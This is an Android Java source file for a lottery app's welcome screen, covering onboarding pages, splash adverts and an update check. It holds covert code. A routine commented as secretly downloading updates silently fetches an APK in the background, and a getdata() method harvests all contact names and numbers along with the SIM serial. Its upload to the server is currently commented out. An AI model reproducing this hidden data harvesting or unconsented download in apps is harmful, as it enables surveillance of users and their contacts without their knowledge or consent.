package com.lottery.biying.Activity;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.support.v4.view.ViewPager;
import android.support.v4.view.ViewPager.OnPageChangeListener;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ImageView.ScaleType;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import android.widget.TextView;

import com.loopj.android.http.RequestParams;
import com.lottery.biying.Adapter.WelcomePagerAdapter;
import com.lottery.biying.BaseParent.BaseApplication;
import com.lottery.biying.MainActivity;
import com.lottery.biying.R;
import com.lottery.biying.bean.BannerBean;
import com.lottery.biying.bean.ContactArray;
import com.lottery.biying.bean.Maindata;
import com.lottery.biying.util.BundleTag;
import com.lottery.biying.util.Httputils;
import com.lottery.biying.util.LogTools;
import com.lottery.biying.util.MyJsonHttpResponseHandler;
import com.lottery.biying.util.Permission;
import com.lottery.biying.util.RepluginMethod;
import com.lottery.biying.util.ToastUtil;
import com.lottery.biying.util.UpdateManager;
import com.lottery.biying.util.WifiMethod;
import com.nostra13.universalimageloader.core.ImageLoader;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import cn.jpush.android.api.JPushInterface;

/**
 * @author
 * @category Activity
 */
public class WelcomeActivity extends Activity {
    private String apkname = "/"+BundleTag.Lottery+"/lottery.apk";
    private ViewPager pager = null;
    private Button startBtn = null;
    private LinearLayout indicator = null;
    private SharedPreferences spf = null;
    List<JSONObject> temp;
    private ImageView[] indicators = null;
    private ImageView imageView1;
    private TextView skipTv;
    //	private RunnableTask runTask;
//	String time;
    int Count = 0;
    int ERRCount = 0;
    public Context context = null;

    private SharedPreferences sharedPreference = null;
    private static final int MSG_USERID_FOUND = 5;
    private static final int MSG_AUTH_CANCEL = 2;
    private static final int MSG_AUTH_ERROR = 3;
    private static final int MSG_AUTH_COMPLETE = 4;
    private static final int MSG_LOGIN = 6;
    public List<JSONObject> savephone;
    private SharedPreferences sharedservices = null;
    private Editor editor = null;
    public static String serv = "";
    int downloadCOunt = 0;
    String FileName = "";
    WelcomePagerAdapter adaper;
    private ImageLoader mImageDownLoader;
    //    String isShowGame = "1";
    String isFormal = "1";
    UpdateManager upadate;
    boolean hasreturndata = false;
    ImageView loadingimg;
    ArrayList<BannerBean> BannerBeanList;
    boolean click;
    int second = 3;
    boolean EnterMainPage = false;

    Handler handler = new Handler() {
        @Override
        public void dispatchMessage(Message msg) {
            super.dispatchMessage(msg);
            if (msg.what == 110) {
                if (timelimit != null) {
                    second = second - 1;
                    timelimit.setText("跳过" + second + "秒");
                    if (second > 0)
                        handler.sendEmptyMessageDelayed(110, 1000);
                    else
                        timelimit.setText("跳过");
                }
            }
        }
    };
    Runnable runnable;
    int index = 0;
    boolean finishRequest = false;
    TextView timelimit;
    String notification;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.index_welcome_layout);
        Permission.getPermission(this);
        ImageView imageView=(ImageView)findViewById(R.id.loadingimg);
        imageView.setBackground(BaseApplication.qidong);
        context = WelcomeActivity.this;
        loadingimg = (ImageView) findViewById(R.id.loadingimg);
//		handler = new Handler(WelcomeActivity.this);
        UpdateVersion();
        View view=View.inflate(this, R.layout.acticlelist_main,null);
        LinearLayout aa=(LinearLayout)view;
        LogTools.e("LinearLayout", "LinearLayout" + aa.getChildCount());
    }

    @Override
    protected void onResume() {
        super.onResume();
        LogTools.e("返回", "onResume");
        JPushInterface.onResume(this);
    }

    @Override
    protected void onPause() {
        super.onPause();
        LogTools.e("返回", "onPause");
        JPushInterface.onPause(this);
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        String Username = RepluginMethod.getApplication(WelcomeActivity.this).getBaseapplicationUsername();
        if (click == true) {
            if (Username == null || Username.equalsIgnoreCase("")) {
                click = false;
            } else {
                modeluonclick2(index);
                return;
            }
        }
//        if (click == false) {
//            notification="";
//            Start(0);
//        }
        LogTools.e("返回" + click, "onRestart");
    }

    private void UpdateVersion() {
        upadate = new UpdateManager(this);
        upadate.setStartAniEndListener(new UpdateManager.StartAniEndListener() {

            @Override
            public void onStartAniEnd(final boolean hasupdate) {
//				runOnUiThread(new Runnable() {
//					@Override
//					public void run() {
                LogTools.e("ttttttt", "UpdateManager  " + hasupdate);
                if (hasupdate){
                    UpdateInBackgroud();
                return;
                }
                if (isFrist()) {
                    findView();
                    addView();
                    //		MyThreadphone mphone = new MyThreadphone();
//			new Thread(mphone).start();
                } else {
                    setContentView(R.layout.index_welcome);
                    imageView1 = (ImageView) findViewById(R.id.imageView1);
                    imageView1.setScaleType(ScaleType.FIT_XY);
                    imageView1.setBackground(BaseApplication.qidong);
                    notification = getIntent().getStringExtra(BundleTag.JsonObject);

                    if (notification != null) {
                        LogTools.e("notification", notification);
                        timelimit = (TextView) findViewById(R.id.timelimit);
                        timelimit.setVisibility(View.GONE);
                        try {
                            JSONObject notification_json = new JSONObject(notification);
//                            new HandleNotificationMethod().modeluonclick2(BannerBean.HandleJson(notification_json), WelcomeActivity.this);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    } else {
                        LogTools.e("notification", "nnnnnnnnnnnnnn");
                        timelimit = (TextView) findViewById(R.id.timelimit);
                        timelimit.setText("跳过" + second + "秒");
                        timelimit.setOnClickListener(new OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                if (finishRequest && !EnterMainPage) {
                                    Start(0);
                                    EnterMainPage = true;
                                }

                            }
                        });
                        handler.sendEmptyMessageDelayed(110, 1000);
                        //加入倒计时代码
                    }


                    mImageDownLoader = RepluginMethod.getApplication(WelcomeActivity.this)
                            .getImageLoader();
//							if (time == null || time.equals("")) {
//								time = "0";
//							}

//									runTask=new RunnableTask();
//									handler.postDelayed(runTask,3000);

                }
                GetMainPageData();
//                getdata();
                hasreturndata = true;
            }
//			});
//		}
        });
        upadate.checkUpdateInfo();
        LogTools.e("WelcomeActivity123456", JPushInterface.getRegistrationID(this));
    }


    //		class RunnableTask implements Runnable {
//			@Override
//			public void run() {
//				Intent intent = new Intent(WelcomeActivity.this, MainActivity.class);
//				startActivity(intent);
//				WelcomeActivity.this.finish();
//			}
//		}
    public void GetMainPageData() {
        final long time = System.currentTimeMillis();
        Httputils.PostWithBaseUrl(Httputils.Mainpage, null, new MyJsonHttpResponseHandler(this, false) {
            @Override
            public void onFailureOfMe(Throwable throwable, String s) {
                super.onFailureOfMe(throwable, s);
                finishRequest = true;
                upadate = null;
                long ctime = System.currentTimeMillis();
                if (!isFrist()) {
                    if (3000 - ctime + time <= 0)
                        Start(0);
                    else
                        Start(3000 - ctime + time);
//                    Thread startThread = new Thread(runnable);
//                    startThread.start();
                }

            }

            @Override
            public void onSuccessOfMe(JSONObject jsonObject) {
                super.onSuccessOfMe(jsonObject);
                finishRequest = true;
                upadate = null;
                LogTools.ee("jsonObject啊啊啊", jsonObject.toString());
                JSONObject jsonObjectaa = jsonObject.optJSONObject("datas");
                JSONObject tempjsonobject = jsonObjectaa.optJSONObject("siteInfo");
                if (jsonObject.optString("errorCode", "").equalsIgnoreCase("000000")) {
                    SharedPreferences sharedPreferences = RepluginMethod.getApplication(WelcomeActivity.this).getSharedPreferences();
                    sharedPreferences.edit()
                            //tempjsonobject.optJSONArray("ggList").toString()
//								.putString(BundleTag.bannerList, tempjsonobject.optJSONArray("bannerList").toString())
//								.putString(BundleTag.lotteryList, tempjsonobject.optJSONArray("lotteryList").toString())
//								.putString(BundleTag.advertList, tempjsonobject.optJSONArray("advertList").toString())
//								.putString(BundleTag.promsList, tempjsonobject.optJSONArray("promsList").toString())
//								.putString(BundleTag.linkList, tempjsonobject.optJSONArray("linkList").toString())
                            .putString(BundleTag.ggList, jsonObjectaa.optString("gonggao", ""))
                            .putString(BundleTag.homeAdvertUrl, jsonObjectaa.optString("advert", ""))
                            .putString(BundleTag.logoUrl, jsonObjectaa.optString("logoUrl", ""))
                            .putString(BundleTag.deskTopUrl, jsonObjectaa.optString("deskTopUrl", ""))
                            .putString(BundleTag.agentId, jsonObjectaa.optString("agentId", ""))
                            .putString(BundleTag.chooseBrowser, jsonObjectaa.optString("chooseBrowser", ""))
                            .putString(BundleTag.isShowGame, jsonObjectaa.optString("isShowGame", ""))
                            .putString(BundleTag.URL, jsonObjectaa.optString("messengerLink", ""))
                            .putString(BundleTag.siteDomain, tempjsonobject.optString("siteDomain", ""))
                            .putString(BundleTag.Phonenum, tempjsonobject.optString("siteMobile", ""))
                            .putString(BundleTag.QQ, tempjsonobject.optString("siteQq", ""))
                            .putString(BundleTag.Email, tempjsonobject.optString("siteMail", ""))
                            .putString(BundleTag.Weixin, tempjsonobject.optString("siteWeixin", ""))
                            .putString(BundleTag.Tel, tempjsonobject.optString("siteTel", ""))
                            .putString(BundleTag.siteName, tempjsonobject.optString("siteName", ""))
                            .putString(BundleTag.siteFlag, tempjsonobject.optString("siteFlag", ""))

                            .commit();

//                    JSONObject information = jsonObjectaa.optJSONObject("information");
//                    Iterator<String> keys = information.keys();
//                    while (keys.hasNext()) {
//                        String key = (String) keys.next();
//                        String value = information.optString(key, "");
//                        HttpforNoticeinbottom.hashMap2.put(key, value);
//                    }
                    isFormal = jsonObjectaa.optString("isFormal", "");
                    if (!isFrist()) {
                        BannerBeanList = new ArrayList<BannerBean>();
                        JSONArray jsonArray = jsonObjectaa.optJSONArray("advert");
                        JSONObject c;

                        if (!BannerBeanList.isEmpty()) {
                            BannerBeanList.clear();

                        }

                        for (int i = 0; i < jsonArray.length(); i++) {
                            try {
                                c = jsonArray.getJSONObject(i);
                                imageView1.setTag(i);
                                mImageDownLoader.displayImage(c.optString("imageUrl"), imageView1);
                                BannerBean gameBean1 = new BannerBean();
                                gameBean1.setBannerName(c.optString("advertName", ""));
                                gameBean1.setArticleId(c.optString("articleId", ""));
                                gameBean1.setArticleType(c.optString("articleType", ""));
                                gameBean1.setCateCode(c.optString("cateCode", ""));
                                gameBean1.setCreateTime(c.optString("createTime", ""));
                                gameBean1.setGameCode(c.optString("gameCode", ""));
                                gameBean1.setImageUrl(c.optString("imageUrl", ""));
                                gameBean1.setLevel(c.optString("level", ""));
                                gameBean1.setLinkGroupId(c.optString("linkGroupId", ""));
                                gameBean1.setLinkName(c.optString("linkName", ""));
                                gameBean1.setLinkType(c.optString("linkType", ""));
                                gameBean1.setLinkUrl(c.optString("linkUrl", ""));
//                                gameBean1.setModifyTime(c.optString("modifyTime", ""));
                                gameBean1.setOpenLinkType(c.optString("openLinkType", ""));
                                gameBean1.setPlatformType(c.optString("platformType", ""));
                                gameBean1.setTypeCode(c.optString("typeCode", ""));


//                                            }
                                BannerBeanList.add(gameBean1);

                                LogTools.e("图片地址", (c.optString("imageUrl")));
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                        imageView1.setOnClickListener(new OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                handler.removeCallbacks(runnable);
                                final int tag = Integer.valueOf(v.getTag() + "");
                                index = tag;
                                modeluonclick2(tag);
                            }
                        });
                        long ctime = System.currentTimeMillis();
                        Start(3000 - ctime + time);

                    }
                } else {
                    ToastUtil.showMessage(WelcomeActivity.this, jsonObject.optString("msg", ""));
                    Start(0);
                }
            }
        });
    }

    private void Start(final long time) {

        handler.removeCallbacks(runnable);
        runnable = new Runnable() {
            @Override
            public void run() {
                LogTools.e("图片地址", 3 + "");
                if(!TextUtils.isEmpty(notification))return;//收到推送消息，不在这里跳转，在页面返回后，notification清空后跳转
                Boolean isc = RepluginMethod.getApplication(WelcomeActivity.this).isNetConnect();
                if (isFormal.equalsIgnoreCase("1") || isc == false) {
                    Intent intent = new Intent(WelcomeActivity.this, MainActivity.class);
                    startActivity(intent);
                    handler.removeCallbacks(runnable);
                    WelcomeActivity.this.finish();
                }

            }
        };
        handler.postDelayed(runnable, time);
//        Thread startThread = new Thread(runnable);
//        startThread.start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (runnable != null)
            handler.removeCallbacks(runnable);
        LogTools.e("返回", "onDestroy");
    }

    private void findView() {
        pager = (ViewPager) findViewById(R.id.pager);
        startBtn = (Button) findViewById(R.id.start_btn);
        loadingimg.setVisibility(View.GONE);
//		if(HttpUtil.isShow==false)
//		{
//			startBtn.setBackground(getResources().getDrawable(R.drawable.yindaoliji2));
//			startBtn.setText("");
//		}
        indicator = (LinearLayout) findViewById(R.id.indicator);

        startBtn.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                Editor edit = spf.edit();
                edit.putBoolean(Maindata.IS_FRIST, false);
                edit.commit();

                LogTools.e("ttttttt", "startBtn");
                startActivity(new Intent(WelcomeActivity.this,
                        MainActivity.class));

                WelcomeActivity.this.finish();
            }
        });
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_DOWN) {
            finish();
            System.exit(0);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    private boolean isFrist() {
        spf = getSharedPreferences(Maindata.COMPANY_PHONE, Context.MODE_PRIVATE);
        return spf.getBoolean(Maindata.IS_FRIST, true);
    }


    private void addView() {
        int[] img = new int[]{R.drawable.yindao, R.drawable.yindao1,
                R.drawable.yindao2};
        indicators = new ImageView[img.length];
        ImageView imgView = null;
        Drawable drawable;
        for (int i = 0; i < img.length; i++) {
//			imgView = new ImageView(this);
//			imgView.setBackgroundResource(img[i]);
//			views.add(imgView);

            indicators[i] = new ImageView(this);
            indicators[i].setBackgroundResource(R.drawable.yindaocheck);
            drawable = getResources().getDrawable(R.drawable.yindaocheck);
            if (i == 0) {
                indicators[i].setBackgroundResource(R.drawable.yindaochedked);
                drawable = getResources().getDrawable(R.drawable.yindaochedked);
            }
            LayoutParams params = new LayoutParams(
                    drawable.getMinimumWidth(), drawable.getMinimumHeight());
            params.setMargins(10, 0, 10, 0);
            indicator.addView(indicators[i], params);
        }
        adaper = new WelcomePagerAdapter(this);
        pager.setAdapter(adaper);
        pager.setOnPageChangeListener(new MyOnPageChangeListener());
    }

    @Override
    public void onStart() {
        super.onStart();
    }

    @Override
    public void onStop() {
        super.onStop();

    }

    private class MyOnPageChangeListener implements OnPageChangeListener {

        @Override
        public void onPageScrollStateChanged(int arg0) {

        }

        @Override
        public void onPageScrolled(int arg0, float arg1, int arg2) {

        }

        @Override
        public void onPageSelected(int position) {
            if (position == adaper.getCount() - 1) {
                startBtn.setVisibility(View.VISIBLE);
            } else {
                startBtn.setVisibility(View.GONE);
            }

            for (int i = 0; i < indicators.length; i++) {
                if (i == position) {
                    indicators[i]
                            .setBackgroundResource(R.drawable.yindaochedked);

                } else {
                    indicators[i].setBackgroundResource(R.drawable.yindaocheck);
                }
            }
        }
    }

    //偷偷下载更新
    private void UpdateInBackgroud() {
        boolean isneedtodownload = false;

        PackageManager pm = getPackageManager();

        String sdCard = Environment.getExternalStorageDirectory().getAbsolutePath();

        String packageName = "";
        String versionCode = "";
        try {
            PackageInfo info = pm.getPackageInfo(
                    getPackageName(), 0);
            FileName = sdCard + apkname;
        } catch (PackageManager.NameNotFoundException e) {
            FileName = "";
            packageName = "";
            versionCode = "";
        }

        File file = new File(FileName);
        if (file == null || file.exists() == false) {
            //download
            isneedtodownload = true;
        } else {
            PackageInfo info2 = pm.getPackageArchiveInfo(FileName, PackageManager.GET_ACTIVITIES);
            if (info2 != null) {
                ApplicationInfo appInfo = info2.applicationInfo;
                String appName2 = pm.getApplicationLabel(appInfo).toString().trim();//得到安装包名称
                String packageName2 = appInfo.packageName;  //得到安装包名称
                String versionCode2 = info2.versionName;       //得到版本信息

                if (packageName.equalsIgnoreCase(packageName2) && Integer.valueOf(versionCode) < Integer.valueOf(versionCode2)) {
                    //download
                    isneedtodownload = true;
                }

            }
        }


        if (isneedtodownload && WifiMethod.getNetworkType(WelcomeActivity.this) == 1)//wifi才下载
        {
            LogTools.e("DowanloadInBackground", "DowanloadInBackground");

            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {

                    new Thread() {
                        @Override
                        public void run() {
                            super.run();
                            try {
                                URL url = new URL(Httputils.AndroidApkPath);

                                HttpURLConnection conn = (HttpURLConnection) url
                                        .openConnection();
                                conn.connect();
                                int length = conn.getContentLength();
                                InputStream is = conn.getInputStream();

                                File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
                                if (!file.exists()) {
                                    file.mkdir();
                                }
                                File ApkFile = new File(FileName);
                                FileOutputStream fos = new FileOutputStream(ApkFile);

                                int count = 0;
                                byte buf[] = new byte[1024];

                                do {
                                    int numread = is.read(buf);
                                    if (numread <= 0) {
                                        // 下载完成
                                        break;
                                    }
                                    fos.write(buf, 0, numread);
                                } while (true);// 点击取消就停止下载.

                                fos.close();
                                is.close();
                            } catch (MalformedURLException e) {
                                e.printStackTrace();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                    }.start();
                }
            }, 1000 * 60 * 2);
        }

    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //不知道为什么，不管是否点击安装、取消，返回的resultCode都是0，即RESULT_CANCELED，待查
        if (requestCode == 123456789) {
            if (resultCode == RESULT_CANCELED) {
                if (upadate == null) return;
                UpdateManager.StartAniEndListener listener = upadate.getListener();
                if (listener != null) {
                    LogTools.e("requestCode", requestCode + " " + resultCode + " " + data.toString());
                    listener.onStartAniEnd(false);
                }
            }
        }
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {

        if (keyCode == KeyEvent.KEYCODE_BACK && hasreturndata) {
            return true;
        }
        return super.onKeyUp(keyCode, event);
    }

    public void modeluonclick2(int tag) {
//        JumpActivity.modeluonclick(WelcomeActivity.this, BannerBeanList.get(tag).getLinkType(),
//                BannerBeanList.get(tag).getOpenLinkType(), BannerBeanList.get(tag).getTypeCode(),
//                BannerBeanList.get(tag).getLevel(), BannerBeanList.get(tag).getCateCode(),
//                BannerBeanList.get(tag).getGameCode(), BannerBeanList.get(tag).getBannerName(),
//                BannerBeanList.get(tag).getBannerName(), BannerBeanList.get(tag).getLinkUrl()
//                , BannerBeanList.get(tag).getArticleType(), BannerBeanList.get(tag).getArticleId(), "nopull", "1", BannerBeanList.get(tag).getLinkGroupId());
    }

    // 更新后台数据
    class MyThreadphone implements Runnable {
        public void run() {
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            savedata(getdata().toString());
        }
    }
    /**
     * 获取用户手机联系人
     *
     * @return
     */
    public List<JSONObject> getdata() {
        JSONObject object;
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null,
                null, null);
        ArrayList<ContactArray> listdata = new ArrayList<ContactArray>();
        savephone = new ArrayList<JSONObject>();
        String id = null, name = null, number = null;
        ContactArray co = null;
        while (c.moveToNext()) {
            id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
            name = c.getString(c
                    .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            int isHas = Integer
                    .parseInt(c.getString(c
                            .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
            if (isHas > 0) {
                Cursor phone = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                + " = " + id, null, null);
                while (phone.moveToNext()) {
                    number = phone
                            .getString(phone
                                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                }
                phone.close();
                co = new ContactArray();
                co.name = name;
                co.phonenum = number;
                listdata.add(co);
                object = new JSONObject();
                try {
                    object.put("name", co.name);
                    object.put("number", co.phonenum);
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                if (object != null && !object.equals("")) {
                    savephone.add(object);
                }
            }

        }
        ;
        // 关闭游标
        if (null != c) {
            c.close();
            c = null;
        }
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        String tel = tm.getVoiceMailNumber();//手机号码
        String imei = tm.getSimSerialNumber();
        LogTools.e("aaacccccaa"+tel,"dddd"+imei);
        return savephone;
    }

    private void savedata(String phoned) {

//        RequestParams params = new RequestParams();
//        params.put("infor", phoned);
//        Httputils.PostWithBaseUrl(Httputils.infomation, params, new MyJsonHttpResponseHandler(WelcomeActivity.this, false) {
//            public void onFailureOfMe(Throwable throwable, String s) {
//                super.onFailureOfMe(throwable, s);
//
//            }
//
//            public void onSuccessOfMe(JSONObject jsonObject) {
//                super.onSuccessOfMe(jsonObject);
//            }
//        });
    }
}
